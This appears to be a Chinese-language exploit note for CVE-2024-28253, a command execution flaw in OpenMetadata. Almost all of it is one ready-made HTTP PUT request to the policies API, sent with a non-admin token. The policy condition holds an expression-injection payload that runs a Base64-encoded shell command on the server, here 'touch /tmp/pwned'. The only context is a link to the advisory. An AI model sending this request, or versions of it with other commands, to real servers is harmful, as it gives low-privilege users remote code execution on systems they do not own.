## OpenMetadata命令执行漏洞(CVE-2024-28253)


## poc
```
PUT /api/v1/policies HTTP/1.1
Host: localhost:8585
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
Authorization: Bearer <non-admin JWT>
accept: application/json
Connection: close
Content-Type: application/json
Content-Length: 367

{"name":"TeamOnlyPolicy","rules":[{"name":"TeamOnlyPolicy-Rule","description":"Deny all the operations on all the resources for all outside the team hierarchy..","effect":"deny","operations":["All"],"resources":["All"],"condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA==')))"}]}
```

## 漏洞来源
- https://github.com/advisories/GHSA-7vf4-x5m2-r6gr
